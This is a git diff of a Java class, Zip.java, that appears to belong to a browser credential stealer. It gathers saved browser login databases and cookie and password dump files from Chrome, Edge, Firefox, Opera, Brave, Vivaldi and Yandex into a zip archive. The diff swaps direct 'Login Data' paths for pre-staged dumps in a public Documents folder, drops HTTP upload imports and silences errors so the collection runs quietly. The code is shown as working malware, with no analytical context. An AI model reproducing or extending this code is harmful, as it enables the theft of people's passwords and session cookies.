@@ -1,10 +1,6 @@
 package io.github.luxotick.impl;
 
 import io.github.luxotick.Start;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.OkHttpClient;
-import okhttp3.RequestBody;
 
 import java.io.*;
 import java.util.Arrays;
@@ -24,22 +20,15 @@ public class Zip {
         };
 
         String[] sourcePaths = {
-                System.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
-                System.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\Login Data",
-                System.getenv("APPDATA") + "\\..\\Roaming\\Mozilla\\Firefox\\Profiles\\avionrhy.default-release\\storage\\default\\moz_cookies.sqlite",
-                System.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera GX Stable\\Login Data",
-                System.getenv("APPDATA") + "\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
-                System.getenv("APPDATA") + "\\..\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
-                System.getenv("APPDATA") + "\\..\\Local\\Vivaldi\\User Data\\Default\\Login Data",
-                "C:\\Users\\Public\\Documents\\dothack.dev",
-                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\BRAVE.txt",
                 "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\CHROME.txt",
-                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\EDGE.txt",
-                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\FIREFOX.txt",
                 "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\OPERA.txt",
-                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\OPERA_GX.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\FIREFOX.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\OPERAGX.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\EDGE.txt",
+                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\BRAVE.txt",
                 "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\VIVALDI.txt",
-                "C:\\Users\\Public\\Documents\\Browsers\\Passwords\\YANDEX.txt"
+                "C:\\Users\\Public\\Documents\\dothack.dev",
+                "C:\\Users\\Public\\Documents\\Browsers\\Passwords.txt"
                 // Add this line to include the USER's Browsers folder
         };
 
@@ -53,7 +42,6 @@ public class Zip {
                 File fileToZip = new File(srcFiles.get(i));
                 if (fileToZip.exists()) { // Check if the file/folder exists
                     FileInputStream fis = new FileInputStream(fileToZip);
-                    System.out.println(fileToZip.getPath());
                     String path = fileToZip.getPath();
                     String folderName = i < browserPaths.length ? browserPaths[i] : "Other";
 
@@ -66,11 +54,12 @@ public class Zip {
                     }
                     fis.close();
                 }
-            } catch (Exception e) {
-                System.out.println("Error: " + e);
+            } catch (Exception ignored) {
             }
         }
         zipOut.close();
         fos.close();
     }
+
+
 }
